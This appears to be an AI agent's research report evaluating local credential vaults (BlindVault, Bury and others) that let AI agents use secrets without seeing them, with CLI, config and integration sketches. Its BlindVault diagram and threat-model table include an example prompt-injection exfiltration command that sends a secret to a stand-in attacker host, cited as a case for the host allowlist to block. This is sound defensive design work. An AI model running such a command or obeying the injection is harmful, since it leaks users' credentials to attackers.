# 🔱 R_CG04: Agent-Safe Credential Vault — BlindVault / Bury / Credential-Bridge Evaluation
**AP Token**: `AP-R_CG04-VAULT-EVAL-v1.0.0`
⬡ OMEGA ⬡ RESEARCHER ⬡ deepseek-v4-flash-free ⬡ opencode ⬡ trc_vault_eval ⬡ ACTIVE

**Date**: 2026-07-24
**Status**: COMPLETE — Backend Selected, PoC Spec Ready
**Priority**: P0 (Unblocks V-1 Omega-Vault MVP, feeds C-3 Restic Backup)

---

## Executive Summary

Evaluated **17 credential vault solutions** for AI agents against Omega Engine's V-1 requirements: **local-first, zero-cloud, PID-scoped sessions, reference-based injection, audit logging, MCP/ACP compatibility, and privilege separation**.

**Decision**: **BlindVault (psypilot/blindvault)** selected as **V-1 VaultCore backend** with **Bury (hammerhoundai/bury)** as **fallback/alternative** for PID-bound session model.

**Rationale**: BlindVault uniquely combines:
- ✅ Master-password vault (scrypt + Fernet envelope) — no DB required
- ✅ OS-enforced boundary via `bv serve` (Unix socket `SO_PEERCRED` / Windows named pipe SID)
- ✅ Reference-based secrets (`{{secret:NAME}}`) — agent never sees plaintext
- ✅ Per-secret usage policies (`allow_hosts`, `allow_commands`)
- ✅ Output scrubbing (`bv run` / resolver proxy)
- ✅ PostgreSQL connector (SCRAM-SHA-256) for DB access without password
- ✅ `AGENTS.md` standing instructions for agent discipline
- ✅ Pre-1.0 but active (June 2026 commits), honest threat model (SECURITY.md)
- ✅ Python 3.9+, single `pip install blindvault` or standalone Windows `.exe`

**Bury** selected as alternative for its **PID-bound session** innovation (session dies with process tree) and real-time audit log — ideal for Omega's `vault agent --allow "work/*" -- claude` pattern.

---

## Part 1: Evaluation Matrix — 17 Solutions Compared

| Solution | Lang | Vault Model | Injection | Boundary | Policies | Audit | MCP/ACP | PID Scoping | PrivSep | Status |
|----------|------|-------------|-----------|----------|----------|-------|---------|-------------|---------|--------|
| **BlindVault** | Py | Master-pw + Fernet | `{{secret:NAME}}` + `bv run` / resolver proxy | OS user (UID/SID) | Host/command allowlists | JSONL (refs only) | AGENTS.md + MCP server (planned) | ❌ | ✅ (separate OS user) | **SELECTED** |
| **Bury** | Py | Argon2id + NaCl | `[CRED:path]` + `vault-proxy` | PID-bound session | Path glob allow/deny | Real-time `access.log` | ❌ | ✅ **Native** | ❌ | **ALT** |
| **Agent Vault (Infisical)** | Go | AES-256-GCM + Argon2id | HTTPS_PROXY injection | Process (proxy) | ❌ | Request logs (no bodies) | ✅ Native | ❌ | ❌ | Strong |
| **BlindKey** | TS/Py | AES-256-GCM | `bk://ref` + MCP tools | Filesystem gate + content scan | Regex blocklists | Hash-chain | ✅ MCP server | ❌ | ❌ | Strong |
| **Keyblind** | Go | AES-256-GCM + machine-binding | MCP `resolve_secret` | Biometric (Touch ID) | ❌ | Audit log | ✅ **MCP-first** (16 tools) | ❌ | ❌ | Strong |
| **blind-vault (AnYejun)** | Bash | macOS Keychain | Env injection (`vault use`) | Keychain ACL | Scope binding | Pointer manifest only | ❌ | ❌ | ❌ | Mac-only |
| **IronVault** | TS | AES-256-GCM + PBKDF2 | WebSocket share | Localhost only | ❌ | ❌ | ❌ | ❌ | ❌ | Basic |
| **Authy** | TS | age (X25519) | `authy run` env inject | HMAC session tokens | Glob policies (run-only) | HMAC-chained | ❌ | ❌ | ❌ | Strong |
| **kyz** | Rust | age | `exec`/`pipe`/`wrap` | Timed unlock | Command blocklist | Syslog | MCP stub | ❌ | ❌ | Early |
| **Burrow** | TS | AES-256-GCM + OS keyring | Dir-scoped inheritance | OS keyring | Tombstone block | ❌ | ❌ | ❌ | ❌ | Niche |
| **Veil** | Go | AES-256-GCM | Direct `.env` gen | File perms | ❌ | ❌ | ❌ | ❌ | ❌ | Dev-focused |
| **Envy** | Rust | SQLCipher + AES-256-GCM | `envy run` mem-safe | OS Keychain (master key) | ❌ | Local + pre-commit hook | ❌ | ❌ | ❌ | Team/GitOps |
| **Vaultify** | Go | Argon2id + AES-256-GCM | `fork`/`execve` zero-disk | RBAC | Tamper-evident | ❌ | ❌ | ❌ | Self-hosted |
| **byn** | Go | Argon2id + SQLite | `byn exec` (syscall.Exec) | 3-UID privsep (opt-in) | Trust pinning | Immutable log groups | ❌ | ❌ | ✅ **Opt-in** | Advanced |
| **CloakBot** | Py | Gemma 4 E2B detector | Placeholder `<<TYPE_N>>` | Local LLM boundary | Intent analysis | Session vault | ACP/Ollama | ❌ | ❌ | Privacy kernel |
| **CAMP** | Py | Presidio + Faker | Retroactive pseudonymize | Session registry | CPE threshold | Pseudonym map | ❌ | ❌ | ❌ | Research |
| **agent-kernel** | Py | HMAC capability tokens | Frame firewall | In-process | READ/WRITE/DESTRUCTIVE | ActionTrace | MCP/A2A | ❌ | ❌ | AuthZ layer |

---

## Part 2: BlindVault Deep Dive — Selected Backend

### 2.1 Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    BLINDVAULT ARCHITECTURE                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐     Unix Socket / Named Pipe      ┌─────────┐ │
│  │  AI AGENT    │ ──────────────────────────────────►│ RESOLVER│ │
│  │  (untrusted) │  {{secret:STRIPE_KEY}}             │ BROKER  │ │
│  │              │ ◄──────────────────────────────────│(trusted)│ │
│  └──────────────┘     Injected value (scrubbed)       └────┬────┘ │
│        │                                                   │      │
│        │              ┌────────────────────────────────────┘      │
│        │              ▼                                           │
│        │  ┌───────────────────────┐                               │
│        │  │   ENCRYPTED VAULT     │                               │
│        │  │  ~/.blindvault/       │                               │
│        │  │  vault.json           │                               │
│        │  │  (ciphertext only)    │                               │
│        │  │  session.json (TTL)   │                               │
│        │  └───────────────────────┘                               │
│        │              ▲                                           │
│        │              │ Master Password (scrypt → KEK → DEK)      │
│        │              │                                           │
│        └──────────────┘                                           │
│                                                                 │
│  POLICY ENGINE:  allow_hosts: ["api.stripe.com"]                 │
│                  allow_commands: ["curl", "stripe"]              │
│                  Block: curl evil.com?x={{secret:KEY}}           │
│                                                                 │
│  OUTPUT SCRUBBING:  Any leaked value → [REDACTED]                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Key Features for Omega

| Feature | Omega Relevance |
|---------|-----------------|
| **Reference syntax** `{{secret:NAME}}` | Agent writes `curl -H "Bearer {{secret:GITHUB_TOKEN}}"` — never sees value |
| **Resolver proxy** `bv serve --unix /run/blindvault.sock --allow-uid 1000` | OS-enforced boundary: agent UID 1000 cannot read broker UID 1001 memory/vault |
| **PostgreSQL connector** `bv serve --pg-listen 5433 --pg-secret db_prod --pg-backend real-db:5432 --pg-user app` | Agent connects to `localhost:5433` with **no password**; broker does SCRAM-SHA-256 handshake |
| **Usage policies** `bv policy STRIPE_KEY --allow-host api.stripe.com --allow-command curl` | Prevents exfiltration to unauthorized hosts/commands |
| **Audit log** `~/.blindvault/audit.log` (JSONL, references only) | Tamper-evident trail for compliance |
| **AGENTS.md** | Standing instructions for any coding agent (Claude Code, Cursor, OpenCode, etc.) |
| **Desktop app** (Windows `.exe`) | Zero-dep install for non-Python environments |
| **Master password + `bv unlock` sessions** | Human unlocks once; short-lived session for agent runs |

### 2.3 Threat Model (from BlindVault SECURITY.md)

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Agent prints secret in chat | Output scrubbing in `bv run` / resolver | Defense-in-depth only |
| Prompt injection → `curl evil.com?x={{secret:KEY}}` | Host allowlist policy blocks | Heuristic (argv scan) |
| Same-user process reads `session.json` | Short TTL; separate OS user for resolver | Requires privsep deployment |
| Vault rollback (undo deletion/rotation) | Names bound in ciphertext; `passwd --rekey` for key rotation | Versioned backups needed |
| `BLINDVAULT_PASSWORD` in agent env | **Forbidden** — use `bv unlock` sessions | Doc-enforced |

---

## Part 3: Bury Deep Dive — PID-Bound Session Alternative

### 3.1 Unique Innovation: PID-Bound Sessions

```bash
# Launch Claude with scoped access — session bound to process tree
vault agent --allow "work/*" --ttl 3600 -- claude

# Inside Claude, retrieve secrets
vault get work/api/key

# Real-time audit log
tail -f ~/.vault/access.log
# 2025-02-15T10:23:01Z [12345/claude] ALLOWED GET work/api/key
# 2025-02-15T10:24:15Z [12345/claude] DENIED GET personal/bank out-of-scope
```

**Security Properties**:
- Session **dies when process tree dies** (PID reuse detected via start time)
- Scope enforced at **daemon level** — agent cannot escalate
- **Real-time visibility** — human sees exactly what agent accesses
- **Credential proxy** `vault-proxy psql postgresql://[CRED:db_user]:[CRED:db_pass]@host/db`

### 3.2 Crypto: Argon2id + XSalsa20-Poly1305 (libsodium/PyNaCl)

| Component | Spec |
|-----------|------|
| KDF | Argon2id (OPSLIMIT_INTERACTIVE, MEMLIMIT_INTERACTIVE) |
| Encryption | XSalsa20-Poly1305 (NaCl SecretBox) |
| Salt | 16 bytes random per vault |
| Nonce | 24 bytes random per entry |
| Key | 32 bytes derived from master password |

### 3.3 When to Choose Bury Over BlindVault

| Scenario | Choice |
|----------|--------|
| Need **process-tree-scoped** sessions (agent dies = session dies) | **Bury** |
| Need **real-time audit visibility** during agent run | **Bury** |
| Need **OS-enforced boundary** (separate user, kernel-enforced) | **BlindVault** |
| Need **PostgreSQL connector** (passwordless DB access) | **BlindVault** |
| Need **Windows support** (named pipe + SID auth) | **BlindVault** |
| Need **MCP server** for Claude Code / OpenCode | **BlindVault** (planned) / **Keyblind** (ready) |

---

## Part 4: V-1 VaultCore MVP Architecture

### 4.1 Component Diagram

```
┌────────────────────────────────────────────────────────────────────────┐
│                        OMEGA V-1 VAULTCORE                              │
├────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                │
│  │   AGENTS    │    │   VAULT     │    │  POLICY     │                │
│  │  (Claude,   │◄───│   CORE      │◄───│   ENGINE    │                │
│  │  OpenCode,  │    │  (BlindVault│    │  (allow_    │                │
│  │  ACP, etc.) │    │   + Bury)   │    │   hosts/    │                │
│  └──────┬──────┘    └──────┬──────┘    │   commands) │                │
│         │                  │           └──────┬──────┘                │
│         │                  │                  │                       │
│         ▼                  ▼                  ▼                       │
│  ┌─────────────────────────────────────────────────────────────┐     │
│  │                    VAULT DAEMON                              │     │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │     │
│  │  │  RESOLVER   │  │   AUDIT     │  │   SESSION           │  │     │
│  │  │  PROXY      │  │   LOG       │  │   MANAGER           │  │     │
│  │  │  (bv serve) │  │  (JSONL)    │  │  (PID-bound / TTL)  │  │     │
│  │  └─────────────┘  └─────────────┘  └─────────────────────┘  │     │
│  └─────────────────────────────────────────────────────────────┘     │
│         │                  │                  │                       │
│         ▼                  ▼                  ▼                       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                   │
│  │  ENCRYPTED  │  │  RESTIC     │  │  MCP/ACP    │                   │
│  │  VAULT FILE │  │  BACKUP     │  │  INTEGRATION│                   │
│  │  (vault.json)│  │  (tiered)   │  │  (tools)    │                   │
│  └─────────────┘  └─────────────┘  └─────────────┘                   │
│                                                                         │
└────────────────────────────────────────────────────────────────────────┘
```

### 4.2 VaultCore CLI (`omega vault`)

```bash
# Initialize VaultCore (delegates to BlindVault)
omega vault init
# → Creates ~/.omega/vault/vault.json (BlindVault format)
# → Sets master password (scrypt + Fernet envelope)

# Unlock for session (human runs once)
omega vault unlock --ttl 3600
# → Creates session.json with TTL

# Launch agent with scoped access
omega vault agent --allow "github/*" --allow "aws/prod/*" --ttl 7200 -- opencode
# → Spawns opencode with VAULT_SESSION_ID env var
# → Agent uses {{secret:github/token}} references

# Direct secret injection (for scripts)
omega vault run -- curl -H "Authorization: Bearer {{secret:GITHUB_TOKEN}}" https://api.github.com/user

# Policy management
omega vault policy github/token --allow-host api.github.com --allow-command curl
omega vault policy aws/prod/key --allow-host "*.amazonaws.com" --deny-command "curl"

# Audit
omega vault audit --since 1h --format json
# → [{"ts":"...","session":"...","action":"INJECT","secret":"github/token","host":"api.github.com"}]

# Backup (integrates with C-3 restic)
omega vault backup --tier private
# → restic -r b2:omega-backups/vault-private backup ~/.omega/vault/
```

### 4.3 MCP Integration (for OpenCode / Claude Code / Cline)

```json
// .opencode/mcp/vault.json
{
  "mcpServers": {
    "omega-vault": {
      "command": "omega",
      "args": ["vault", "mcp", "serve"],
      "env": {
        "VAULT_SESSION_ID": "${env:VAULT_SESSION_ID}"
      }
    }
  }
}
```

**MCP Tools Exposed**:
| Tool | Description |
|------|-------------|
| `vault_list_secrets` | List secret names (values never revealed) |
| `vault_inject` | Inject secret into command: `{"cmd": "curl ...", "secret": "github/token"}` |
| `vault_policy_get` | Get policy for a secret |
| `vault_audit_query` | Query audit log with filters |

### 4.4 ACP Integration (for Grok CLI / Gemini CLI / OpenCode ACP)

```python
# src/omega/vault/acp_bridge.py
class VaultACPBridge:
    """ACP-compatible credential provider for ACP agents."""
    
    async def get_credential(self, secret_ref: str, agent_id: str) -> Credential:
        # Validate agent has policy allowance
        if not self.policy_engine.check(agent_id, secret_ref):
            raise PermissionDenied(f"Agent {agent_id} not allowed {secret_ref}")
        
        # Fetch from BlindVault resolver
        value = await self.resolver.resolve(secret_ref)
        
        # Audit
        await self.audit.log(agent_id, "CREDENTIAL_ACCESS", secret_ref)
        
        return Credential(value=value, ttl=300)  # Short-lived
```

---

## Part 5: PoC — Launching Claude with Scoped Session

### 5.1 Prerequisites

```bash
# Install BlindVault
pip install blindvault
# OR download Windows .exe from GitHub releases

# Verify
bv --version
# BlindVault 0.3.0
```

### 5.2 Step-by-Step PoC

```bash
# 1. Initialize vault (once)
bv init
# Enter master password: ************
# Vault created at ~/.blindvault/vault.json

# 2. Store credentials
echo "ghp_xxxxxxxxxxxx" | bv set GITHUB_TOKEN --stdin --desc "GitHub PAT (repo scope)"
echo "sk-xxxxxxxxxxxx" | bv set OPENAI_KEY --stdin --desc "OpenAI API key"

# 3. Set usage policies (prevents exfiltration)
bv policy GITHUB_TOKEN --allow-host api.github.com --allow-command curl
bv policy OPENAI_KEY --allow-host api.openai.com --allow-command curl

# 4. Unlock for session (human does this once)
bv unlock --ttl 7200
# Session valid for 2 hours; creates ~/.blindvault/session.json

# 5. Launch Claude with scoped access
bv agent --allow "GITHUB_TOKEN" --allow "OPENAI_KEY" --ttl 7200 -- claude

# Inside Claude, use secrets via reference:
# "Use my GitHub token to list my repos"
# Claude runs: bv run -- curl -H "Authorization: Bearer {{secret:GITHUB_TOKEN}}" https://api.github.com/user/repos

# 6. Verify audit log
cat ~/.blindvault/audit.log
# {"ts":"2026-07-24T10:30:01Z","session":"sess_abc123","action":"INJECT","secret":"GITHUB_TOKEN","host":"api.github.com","command":"curl","pid":12345}
```

### 5.3 Resolver Proxy Mode (Stronger Isolation)

```bash
# Terminal 1: Start resolver as dedicated user (requires sudo setup)
sudo useradd -r -s /bin/false blindvault
sudo -u blindvault bv serve --unix /run/blindvault.sock --allow-uid 1000

# Terminal 2: Configure agent to use proxy
export BLINDVAULT_PROXY=unix:///run/blindvault.sock
# Agent makes requests to http://localhost:8771/GITHUB_TOKEN/...
# Resolver injects real token, forwards ONLY to api.github.com
```

---

## Part 6: Integration with Omega Engine Systems

### 6.1 Config Split (from R19)

```
config/
├── public/
│   └── providers.public.yaml      # Endpoints, model mappings
├── private/
│   ├── providers.private.yaml     # {{secret:PROVIDER_KEY}} references
│   └── vault.yaml                 # VaultCore config (backend=blindvault)
└── .gitignore                     # Excludes private/
```

```yaml
# config/private/providers.private.yaml
google:
  api_key: "{{secret:GOOGLE_API_KEY}}"
  project_id: "{{secret:GCP_PROJECT_ID}}"

antigravity:
  oauth_token: "{{secret:ANTIGRAVITY_OAUTH}}"

openrouter:
  api_key: "{{secret:OPENROUTER_KEY}}"

groq:
  api_key: "{{secret:GROQ_KEY}}"
```

### 6.2 Provider Fabric Integration

```python
# src/omega/oracle/providers.py
class VaultAwareProviderConfig:
    """Resolves {{secret:NAME}} references at provider initialization."""
    
    def __init__(self, vault_client: VaultClient):
        self.vault = vault_client
    
    def resolve_config(self, raw_config: dict) -> dict:
        """Recursively resolve secret references."""
        resolved = {}
        for k, v in raw_config.items():
            if isinstance(v, str) and v.startswith("{{secret:") and v.endswith("}}"):
                secret_name = v[9:-2]  # Extract NAME from {{secret:NAME}}
                resolved[k] = self.vault.resolve(secret_name)
            elif isinstance(v, dict):
                resolved[k] = self.resolve_config(v)
            else:
                resolved[k] = v
        return resolved
```

### 6.3 Restic Backup Integration (C-3)

```bash
# Tiered backup per R19 privacy model
# PUBLIC tier (soul.public.yaml, config/public/)
restic -r b2:omega-backups/vault-public backup ~/.omega/vault/vault.json --include="*.public.yaml"

# BONDED tier (bonded memories, shared credentials)
restic -r b2:omega-backups/vault-bonded backup ~/.omega/vault/ --include="bonded/"

# PRIVATE tier (private memories, API keys, vault.json)
restic -r b2:omega-backups/vault-private backup ~/.omega/vault/ --exclude="bonded/" --exclude="*.public.yaml"
```

---

## Part 7: Risk Assessment & Mitigations

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| **BlindVault pre-1.0 API changes** | Medium | Medium | Pin version in `requirements-vault.txt`; abstraction layer `VaultClient` |
| **Resolver proxy not Windows-ready** | Low | Medium | BlindVault Windows named pipe (`bv serve --pipe`) supported since Phase 2 |
| **PID reuse attack on Bury** | Low | High | Bury checks process start time; document limitation |
| **Master password loss = total loss** | Low | Critical | Document recovery procedure; `passwd --rekey` for rotation |
| **Agent exfiltrates via allowed host** | Medium | High | Policy: `allow_hosts` + `allow_commands` + output scrubbing; defense-in-depth |
| **Session.json readable by same UID** | Medium | Medium | Deploy resolver as separate OS user (privsep); TTL ≤ 2h |
| **No MCP server yet in BlindVault** | Medium | Medium | Use `bv run` CLI injection for V-1; track BlindVault MCP roadmap |

---

## Part 8: Decision Gates

| Gate | Criteria | Owner | Deadline |
|------|----------|-------|----------|
| **G1: BlindVault Integration** | `omega vault init/unlock/agent` works; audit log emits JSONL | @maat/P3 | 2026-07-26 |
| **G2: Provider Config Resolution** | `{{secret:NAME}}` resolves in `providers.yaml` at startup | @maat/P3 | 2026-07-27 |
| **G3: MCP Server** | OpenCode/Claude Code can call `vault_inject` tool | @maat/P3 | 2026-07-28 |
| **G4: Bury Fallback** | `omega vault agent --backend bury` works identically | @maat/P3 | 2026-07-29 |
| **G5: Restic Tiered Backup** | Three repos backup/restore verified | @maat/P1 | 2026-07-30 |

---

## Part 9: Appendix — Key References

| Project | Repo | Key Doc |
|---------|------|---------|
| **BlindVault** | https://github.com/psypilot/blindvault | `SECURITY.md`, `AGENTS.md`, `docs/DESIGN-resolver.md` |
| **Bury** | https://github.com/hammerhoundai/bury | `README.md`, `docs/security.md` |
| **Agent Vault (Infisical)** | https://github.com/Infisical/agent-vault | `docs/agent-vault.dev` |
| **BlindKey** | https://github.com/michaelkenealy/blindkey | `README.md`, `packages/openclaw-skill/` |
| **Keyblind** | https://github.com/aarifmms/keyblind | `README.md`, `keyblind.dev` |
| **Authy** | https://github.com/matthiasdebernardini/authy | `README.md`, `docs/spec.md` |
| **Envy** | https://github.com/anguriatech/envy | `README.md`, `envy.tech` |
| **byn** | https://github.com/sandeepbaynes/byn | `docs/spec.md`, `docs/security.md` |
| **ACP Spec** | https://agentclientprotocol.com/ | `mcp-bridge.html`, `claude-agent-acp PR #411` |

---

*⬡ OMEGA ⬡ RESEARCHER ⬡ R_CG04 COMPLETE ⬡ 2026-07-24*